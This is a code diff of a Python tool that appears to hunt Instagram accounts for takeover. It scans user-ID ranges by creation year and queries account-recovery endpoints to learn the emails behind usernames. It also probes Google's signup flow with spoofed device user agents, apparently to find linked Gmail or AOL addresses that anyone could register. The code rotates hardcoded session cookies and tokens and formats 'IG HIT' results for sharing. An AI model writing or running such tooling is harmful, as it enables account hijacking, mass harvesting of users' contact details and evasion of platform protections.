@@ -30,23 +30,29 @@ M     = Fore.MAGENTA
 RESET = Style.RESET_ALL
 B     = Style.BRIGHT
 
-ID_RANGES = [
-    (1,           100000000,  2010),
-    (100000001,   279760000,  2011),
-    (279760001,   900990000,  2012),
-    (900990001,   1629010000, 2013),
-    (1629010001,  2400000000, 2014),
-    (2400000001,  3200000000, 2015),
-    (3200000001,  3900000000, 2016),
-    (3900000001,  4500000000, 2017),
-    (4500000001,  5000000000, 2018),
-    (5000000001,  6000000000, 2019),
+WORKING_RANGES = [
+    (1,             5000000,    2010),
+    (5000001,       17750000,   2011),
+    (17750001,      279760000,  2012),
+    (279760001,     900990000,  2013),
+    (900990001,     1629010000, 2014),
+    (1629010001,    2369359761, 2015),
+    (2369359762,    4239516754, 2016),
+    (4239516755,    6345108209, 2017),
+    (6345108210,    10016232395,2018),
+    (10016232396,   27238602159,2019),
+    (27238602160,   43464475395,2020),
+    (43464475395,   50289297647,2021),
+    (50289297647,   57464707082,2022),
+    (57464707082,   63313426938,2023),
+    (63313426938,   70134323896,2024),
+    (70313426938,   78313496938,2025),
 ]
 
 def gdate(user_id):
     try:
         user_id = int(user_id)
-        for lower, upper, year in ID_RANGES:
+        for lower, upper, year in WORKING_RANGES:
             if lower <= user_id <= upper:
                 return year
         return 2019
@@ -125,36 +131,11 @@ def _send_telegram(token, chat_id, text):
 
 def get_year_range(year_choice):
     if year_choice is None:
-        return 1, 6000000000
-    for lower, upper, year in ID_RANGES:
+        return 1, 78313496938
+    for lower, upper, year in WORKING_RANGES:
         if year == year_choice:
             return lower, upper
-    return 1, 6000000000
-
-# ── WEYN hit message format (retained) ──
-def format_hit(hit_num, username, email, followers, following, bio, reset_text):
-    return f"""
-╔═━━━────────────━━━═╗
-        WEYN IG HIT #{hit_num}
-╚═━━━────────────━━━═╝
-
-╭──〔🔛 W E Y N TOOLS🔛〕─────────────╮
-│
-│  𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞   ➤  @{username}
-│  𝐄𝐦𝐚𝐢𝐥      ➤  {email}
-│  𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬  ➤  {followers}
-│  𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠  ➤  {following}
-│  𝐁𝐢𝐨        ➤  {bio}
-│  𝐑𝐞𝐬𝐞𝐭      ➤  {reset_text}
-│
-├──〔 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐋𝐈𝐍𝐊 〕──────────────────┤
-│
-│  https://www.instagram.com/{username}
-│
-╰──────────────────────────────────────╯
-
-        @jinbelowg @weyn_vouches
-"""
+    return 1, 78313496938
 
 
 # ══════════════════════════════════════════════════════════
@@ -182,21 +163,43 @@ _web_state = {
 }
 _web_lock = Lock()
 
-# ── Session pool for "About This Account" ──
-_m1_ABOUT_SESSION_INDEX = 0
-_m1_ABOUT_SESSION_LOCK  = Lock()
-_m1_ABOUT_SESSION_ID    = ""
-_m1_ABOUT_CSRF_TOKEN    = ""
-_m1_ABOUT_DS_USER_ID    = ""
-_m1_ABOUT_COOKIE_STR    = ""
-_m1_about_token_lock    = Lock()
-_m1_about_tokens        = {
-    "fb_dtsg": None, "lsd": None,
-    "rev": "1035271382",
-    "bkv": "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739"
-}
-_m1_session  = requests.Session()
+# ── Configuration ──
+
+_M1_INSTA_GRAPHQL = "https://www.instagram.com/api/graphql"
+_M1_GOOGLE_URL    = "https://accounts.google.com"
+_M1_FORM_TYPE     = "application/x-www-form-urlencoded; charset=UTF-8"
+_M1_TOKEN_FILE    = "gmail_token.txt"
+_M1_DOMAINS       = ["@gmail.com", "@aol.com"]
+
+_M1_BASE_URL      = "https://www.instagram.com"
+_M1_RESET_URL     = "https://www.instagram.com/accounts/password/reset/"
+_M1_SEND_AJAX_URL = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
+_M1_UA_WEB        = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
+_M1_UA_APP        = "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)"
+_M1_ABOUT_WEB_UA  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0"
+
+_M1_USER_AGENTS = [
+    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
+    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
+    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
+    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
+    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
+    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
+    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
+    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
+    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
+    "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
+]
+
+_M1_WEB_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+]
+
 _m1__session = requests.Session()
+
+# ── About-session helpers ──
 
 HARDCODED_SESSIONS = [
     {
@@ -215,60 +218,19 @@ HARDCODED_SESSIONS = [
     }
 ]
 
-_M1_VIP_CONFIG = {
-    "vip_date_filter": True,
-    "vip_follower_filter": False,
-    "vip_min_followers": 0,
-    "vip_date_min": 2010,
-    "vip_date_max": 2019,
-    "vip_about_info": True,
-    "vip_country": False
+_m1_about_session_index = 0
+_m1_about_session_lock  = Lock()
+_m1_ABOUT_SESSION_ID    = ""
+_m1_ABOUT_CSRF_TOKEN    = ""
+_m1_ABOUT_DS_USER_ID    = ""
+_m1_ABOUT_COOKIE_STR    = ""
+_m1_about_tokens        = {
+    "fb_dtsg": None, "lsd": None,
+    "rev": "1035271382",
+    "bkv": "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739"
 }
+_m1_about_token_lock = Lock()
 
-_M1_CONFIG = {
-    "insta_graphql": "https://www.instagram.com/api/graphql",
-    "google_url": "https://accounts.google.com",
-    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "token_file": "tokens.txt",
-    "domain": "@gmail.com",
-    "id_ranges": ID_RANGES,
-}
-
-_M1_ABOUT_WEB_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0"
-
-_M1_USER_AGENTS = [
-    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
-    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
-    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
-    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
-    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
-    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
-    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
-    "Instagram 321.0.0.28.120 Android (33/13; 440dpi; 1080x2400; xiaomi; 2211133G; ruby; mt6983; en_US; 467882419)",
-    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2412; OnePlus; CPH2413; NE2213; qcom; en_GB; 453228190)",
-    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; realme; RMX3311; serpent; qcom; en_US; 442119875)",
-    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2340; samsung; SM-M526BR; m52x; qcom; en_US; 483662991)",
-    "Instagram 322.0.0.45.112 Android (34/14; 400dpi; 1080x2400; sony; XQ-CT72; pdx234; qcom; en_US; 498722341)",
-    "Instagram 319.0.0.30.121 Android (31/12; 420dpi; 1080x2400; oppo; CPH2457; PHB110; mt6895; en_US; 462775910)",
-    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2340; samsung; SM-A346B; a34x; mt6877; en_GB; 479201567)",
-    "Instagram 322.0.0.45.112 Android (34/14; 440dpi; 1080x2400; motorola; XT2303-2; crosby; qcom; en_US; 492874115)",
-    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2376; honor; FNE-NX9; fne; kirin9000; en_GB; 431597221)",
-    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; xiaomi; 2201117TY; veux; qcom; en_US; 487266531)",
-    "Instagram 319.0.0.30.121 Android (32/12; 440dpi; 1080x2340; samsung; SM-M336B; m33x; exynos1280; en_US; 471823650)",
-    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
-    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1440x3120; lg; LM-V600; judyln; qcom; en_US; 499178234)",
-    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
-    "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
-]
-
-_M1_BASE_URL      = "https://www.instagram.com"
-_M1_RESET_URL     = "https://www.instagram.com/accounts/password/reset/"
-_M1_SEND_AJAX_URL = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
-_M1_UA_WEB        = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
-_M1_UA_APP        = "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)"
-
-
-# ── About-session helpers ──
 
 def _m1_build_cookie_str(s):
     return (
@@ -280,11 +242,11 @@ def _m1_build_cookie_str(s):
     )
 
 def _m1_next_about_session():
-    global _m1_ABOUT_SESSION_INDEX, _m1_ABOUT_SESSION_ID, _m1_ABOUT_CSRF_TOKEN
+    global _m1_about_session_index, _m1_ABOUT_SESSION_ID, _m1_ABOUT_CSRF_TOKEN
     global _m1_ABOUT_DS_USER_ID, _m1_ABOUT_COOKIE_STR
-    with _m1_ABOUT_SESSION_LOCK:
-        s = HARDCODED_SESSIONS[_m1_ABOUT_SESSION_INDEX % len(HARDCODED_SESSIONS)]
-        _m1_ABOUT_SESSION_INDEX += 1
+    with _m1_about_session_lock:
+        s = HARDCODED_SESSIONS[_m1_about_session_index % len(HARDCODED_SESSIONS)]
+        _m1_about_session_index += 1
     _m1_ABOUT_SESSION_ID  = s["sessionid"]
     _m1_ABOUT_CSRF_TOKEN  = s["csrftoken"]
     _m1_ABOUT_DS_USER_ID  = s["ds_user_id"]
@@ -293,7 +255,8 @@ def _m1_next_about_session():
 
 def _m1_random_about_session():
     s = random.choice(HARDCODED_SESSIONS)
-    return s["sessionid"], s["csrftoken"], s["ds_user_id"], _m1_build_cookie_str(s)
+    cookie_str = _m1_build_cookie_str(s)
+    return s["sessionid"], s["csrftoken"], s["ds_user_id"], cookie_str
 
 def _m1_about_refresh_tokens(cookie_str=None, username="instagram"):
     global _m1_about_tokens, _m1_ABOUT_SESSION_ID, _m1_ABOUT_COOKIE_STR
@@ -310,8 +273,7 @@ def _m1_about_refresh_tokens(cookie_str=None, username="instagram"):
                 "Accept-Encoding": "gzip, deflate",
                 "Cookie": _cookie,
                 "Referer": "https://www.instagram.com/",
-            },
-            timeout=10
+            }
         )
         html  = resp.text
         m     = re.search(r'"f":"([^"]+)"', html)
@@ -384,7 +346,7 @@ def _m1_try_get_about(user_id, username):
             "sec-fetch-dest": "empty",
             "sec-fetch-mode": "cors",
             "sec-fetch-site": "same-origin",
-        }, data=urllib.parse.urlencode(post_params), timeout=10)
+        }, data=urllib.parse.urlencode(post_params))
         raw = resp.text
         if raw.startswith("for (;;);"):
             raw = raw[9:]
@@ -395,7 +357,7 @@ def _m1_try_get_about(user_id, username):
             return {"join_date": None, "country": None, "former_usernames": []}
         result   = {"join_date": None, "country": None, "former_usernames": []}
         text_str = json.dumps(parsed, ensure_ascii=False)
-        for pat in [r'Kat\u0131lma tarihi ([A-Za-z\u00c7\u00e7\u011e\u011f\u0130\u0131\u00d6\u00f6\u015e\u015f\u00dc\u00fc]+ \d{4})',
+        for pat in [r'Katilma tarihi ([A-Za-z\u00c7\u00e7\u011e\u011f\u0130\u0131\u00d6\u00f6\u015e\u015f\u00dc\u00fc]+ \d{4})',
                     r'Date joined ([A-Za-z]+ \d{4})']:
             mt = re.search(pat, text_str)
             if mt:
@@ -408,7 +370,7 @@ def _m1_try_get_about(user_id, username):
                     d   = item.get("data", {})
                     key = d.get("key", "")
                     if "about_this_account_country" in key and "visibility" not in key:
-                        result["country"] = d.get("initial", "Payla\u015f\u0131lmad\u0131")
+                        result["country"] = d.get("initial", "Paylasilmadi")
                         break
         except Exception:
             pass
@@ -447,81 +409,46 @@ def _m1_rest_web_check_email(email):
                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                 }
             )
-            return response.json().get("allow_shared_email_registration") is True
+            data = response.json()
+            return data.get("allow_shared_email_registration") is True
     except Exception:
         return False
 
 def _m1_rest_bloks_v2(email):
-    global _m1_limit
     url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
     device  = str(uuid.uuid4())
     family  = str(uuid.uuid4())
     android = "android-" + secrets.token_hex(8)
-    uid4_4  = str(uuid.uuid4())
-    aac_obj = json.dumps({
-        "aac_init_timestamp": int(time.time()),
-        "aacjid": str(uuid.uuid4()),
-        "aaccs": secrets.token_urlsafe(32)
-    }, separators=(',', ':'))
-    params_obj = {
-        "client_input_params": {
-            "aac": aac_obj,
-            "flash_call_permissions_status": {
-                "READ_PHONE_STATE": "PERMANENTLY_DENIED",
-                "READ_CALL_LOG": "DENIED",
-                "ANSWER_PHONE_CALLS": "DENIED"
-            },
-            "was_headers_prefill_available": 0,
-            "network_bssid": None,
-            "sfdid": "",
-            "fetched_email_token_list": {},
-            "search_query": email,
-            "auth_secure_device_id": "",
-            "ig_oauth_token": [],
-            "cloud_trust_token": None,
-            "was_headers_prefill_used": 0,
-            "sso_accounts_auth_data": [],
-            "encrypted_msisdn": "",
-            "device_network_info": None,
-            "text_input_id": "akyuf0:61",
-            "zero_balance_state": None,
-            "android_build_type": "release",
-            "accounts_list": [],
-            "is_oauth_without_permission": 0,
-            "ig_android_qe_device_id": device,
-            "gms_incoming_call_retriever_eligibility": "client_not_supported",
-            "search_screen_type": "email_or_username",
-            "is_whatsapp_installed": 1,
-            "lois_settings": {"lois_token": ""},
-            "ig_vetted_device_nonce": None,
-            "headers_infra_flow_id": "",
-            "fetched_email_list": []
-        },
-        "server_params": {
-            "event_request_id": str(uuid.uuid4()),
-            "is_from_logged_out": 0,
-            "layered_homepage_experiment_group": None,
-            "device_id": android,
-            "login_surface": "login_home",
-            "waterfall_id": str(uuid.uuid4()),
-            "INTERNAL__latency_qpl_instance_id": 6.3987980400102e13,
-            "is_platform_login": 0,
-            "context_data": "",
-            "login_entry_point": "logged_out",
-            "INTERNAL__latency_qpl_marker_id": 36707139,
-            "family_device_id": family,
-            "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
-            "access_flow_version": "pre_mt_behavior",
-            "is_from_logged_in_switcher": 0,
-            "qe_device_id": device
-        }
-    }
     payload = {
-        'params': json.dumps(params_obj, separators=(',', ':')),
+        'params': (
+            '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) +
+            ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) +
+            '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
+            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},'
+            '"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"",'
+            '"fetched_email_token_list":{},"search_query":"' + email +
+            '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,'
+            '"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"",'
+            '"device_network_info":null,"text_input_id":"akyuf0:61","zero_balance_state":null,'
+            '"android_build_type":"release","accounts_list":[],"is_oauth_without_permission":0,'
+            '"ig_android_qe_device_id":"' + device +
+            '","gms_incoming_call_retriever_eligibility":"client_not_supported",'
+            '"search_screen_type":"email_or_username","is_whatsapp_installed":1,'
+            '"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,'
+            '"headers_infra_flow_id":"","fetched_email_list":[]},'
+            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
+            '","is_from_logged_out":0,"layered_homepage_experiment_group":null,'
+            '"device_id":"' + android + '","login_surface":"login_home","waterfall_id":"' +
+            str(uuid.uuid4()) + '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,'
+            '"is_platform_login":0,"context_data":"","login_entry_point":"logged_out",'
+            '"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family +
+            '","offline_experiment_group":"caa_iteration_v3_perf_ig_4",'
+            '"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,'
+            '"qe_device_id":"' + device + '"}}'
+        ),
         'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
         'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
     }
-    tz_offset = str(int(datetime.now().astimezone().utcoffset().total_seconds()))
     headers = {
         'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
         'accept-language': "en-IN, en-US",
@@ -533,18 +460,15 @@ def _m1_rest_bloks_v2(email):
         'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
         'x-ig-device-id': device,
         'x-ig-family-device-id': family,
-        'x-ig-timezone-offset': tz_offset,
+        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
         'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
         'x-pigeon-rawclienttime': str(time.time()),
-        'x-pigeon-session-id': f"UFS-{uid4_4}-0",
+        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
     }
     try:
         response = requests.post(url, data=payload, headers=headers, timeout=20)
         if email in response.text:
             return email
-        elif 'SOMETHING, GOT F3CKED' in response.text:
-            _m1_limit += 1
-            return None
         return None
     except Exception:
         return None
@@ -567,7 +491,7 @@ def _m1_rest_bloks(email):
             "search_query": email,
             "bloks_versioning_id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb"
         }
-        with httpx.Client(http2=True, timeout=8) as client:
+        with httpx.Client(http2=True) as client:
             r = client.post(
                 "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
                 data=data, headers=headers
@@ -587,6 +511,9 @@ def _m1_lookup_instagram(email):
     except Exception:
         pass
     return False
+
+
+# ── Reset email fetch ──
 
 def _m1_rest_v1(username):
     max_retries = 2
@@ -634,8 +561,7 @@ def _m1_rest_v1(username):
                 "sec-fetch-mode"   : "cors",
                 "sec-fetch-site"   : "same-origin",
             }
-            from urllib.parse import urlencode as _urlencode
-            data = _urlencode({"email_or_username": username})
+            data = urllib.parse.urlencode({"email_or_username": username})
             r = client.post(_M1_SEND_AJAX_URL, content=data.encode(), headers=headers)
             client.close()
             result = r.json()
@@ -657,131 +583,86 @@ def _m1_rest_v1(username):
             return "-"
     return "-"
 
-def _m1_get_masked(query):
-    url = "https://www.instagram.com/api/graphql"
-    payload = {
-        'av': "0", '__d': "www", '__user': "0", '__a': "1", '__req': "f",
-        '__hs': "20563.HYP:instagram_web_pkg.2.1...0", 'dpr': "3",
-        '__ccg': "GOOD", '__rev': "1037676804", '__s': "nz2w5z:1vm2xs:94sap8",
-        '__hsi': "7630740602831122681",
-        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
-        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
-        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
-        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
-        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
-        '__comet_req': "7",
-        'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8", 'jazoest': "22394",
-        '__spin_r': "1037676804", '__spin_b': "trunk", '__spin_t': "1776670246",
-        '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
-        'qpl_active_flow_ids': "516759801",
-        'fb_api_caller_class': "RelayModern",
-        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
-        'server_timestamps': "true",
-        'variables': '{"params":{"event_request_id":"7ca5daae-5770-42dd-b77b-0cf23a865a7f","next_uri":"","search_query":"' + query + '","waterfall_id":"553aadae-3ec5-4031-8395-efbabcc670ce"}}',
-        'doc_id': "26178667145161478",
-        'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
-    }
-    headers = {
-        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-        'x-ig-app-id': "936619743392459",
-        'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
-        'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
-        'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
-        'origin': "https://www.instagram.com",
-        'referer': "https://www.instagram.com/accounts/password/reset/",
-        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
-    }
+
+# ── Google / Gmail token helpers ──
+
+def _m1_gtokens():
+    max_retries = 2
+    endpoint    = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
+    alphabet    = "abcdefghijklmnopqrstuvwxyz"
+    for attempt in range(max_retries + 1):
+        try:
+            n1   = "".join(random.choices(alphabet, k=random.randint(6, 9)))
+            n2   = "".join(random.choices(alphabet, k=random.randint(3, 9)))
+            host = "".join(random.choices(alphabet, k=random.randint(15, 30)))
+            headers = {
+                "accept": "*/*",
+                "accept-language": "en-GB,en;q=0.9",
+                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+                "google-accounts-xsrf": "1",
+                "user-agent": random.choice(_M1_USER_AGENTS)
+            }
+            res1 = requests.get(f"{_M1_GOOGLE_URL}{endpoint}", headers=headers, timeout=15)
+            if res1.status_code != 200:
+                continue
+            tok = re.search(
+                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
+                res1.text
+            )
+            if not tok:
+                continue
+            tl = tok.group(2)
+            cookies = {"__Host-GAPS": host}
+            headers.update({
+                "authority": "accounts.google.com",
+                "origin": _M1_GOOGLE_URL,
+                "referer": f"{_M1_GOOGLE_URL}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
+                "user-agent": random.choice(_M1_USER_AGENTS)
+            })
+            data = {
+                "f.req": f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+                "deviceinfo": '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
+            }
+            response = requests.post(
+                f"{_M1_GOOGLE_URL}/_/signup/validatepersonaldetails",
+                cookies=cookies, headers=headers, data=data, timeout=15
+            )
+            if '",null,"' in response.text:
+                tl = response.text.split('",null,"')[1].split('"')[0]
+            host = response.cookies.get("__Host-GAPS", host)
+            with open(_M1_TOKEN_FILE, "w") as f:
+                f.write(f"{tl}//{host}\n")
+            return True
+        except Exception:
+            continue
     try:
-        response = requests.post(url, data=payload, headers=headers, timeout=8)
-        contact_points = response.json()["data"]["caa_ar_ig_account_search"]["contact_points"]
-        has_phone = any(i.get("type") == "PHONE" for i in contact_points)
-        email_val = next((i["contact_point"] for i in contact_points if i["type"] == "EMAIL"), None)
-        return email_val, has_phone
+        headers2 = {
+            "accept": "*/*",
+            "accept-language": "en",
+            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "origin": "https://accounts.google.com",
+            "referer": "https://accounts.google.com/",
+            "user-agent": random.choice(_M1_USER_AGENTS),
+            "x-goog-ext-278367001-jspb": '["GlifWebSignIn"]',
+            "x-same-domain": "1"
+        }
+        params2 = {"rpcids": "NHJMOd", "source-path": "/lifecycle/steps/signup/username", "hl": "en"}
+        fake_em = "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890.", k=random.randint(16, 26)))
+        data2   = f"f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_em}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D"
+        resp2   = requests.post(
+            "https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute",
+            params=params2, headers=headers2, data=data2, timeout=15
+        )
+        tl_match = re.search(r'"TL:([^"]+)"', resp2.text)
+        if tl_match:
+            tl   = tl_match.group(1)
+            host = "".join(random.choices(alphabet, k=random.randint(15, 30)))
+            with open(_M1_TOKEN_FILE, "w") as f:
+                f.write(f"{tl}//{host}\n")
+            return True
     except Exception:
-        return None, False
-
-def _m1_get_country_flag(country_name):
-    if not country_name or country_name in ["-", "Payla\u015f\u0131lmad\u0131", "None", ""]:
-        return ""
-    flags = {
-        "T\u00fcrkiye": "\U0001f1f9\U0001f1f7", "Irak": "\U0001f1ee\U0001f1f6",
-        "Fransa": "\U0001f1eb\U0001f1f7", "Endonezya": "\U0001f1ee\U0001f1e9",
-        "Arjantin": "\U0001f1e6\U0001f1f7", "Almanya": "\U0001f1e9\U0001f1ea",
-        "Amerika Birle\u015fik Devletleri": "\U0001f1fa\U0001f1f8",
-        "Birle\u015fik Krall\u0131k": "\U0001f1ec\U0001f1e7",
-        "\u0130ngiltere": "\U0001f1ec\U0001f1e7", "\u0130talya": "\U0001f1ee\U0001f1f9",
-        "\u0130spanya": "\U0001f1ea\U0001f1f8", "Hollanda": "\U0001f1f3\U0001f1f1",
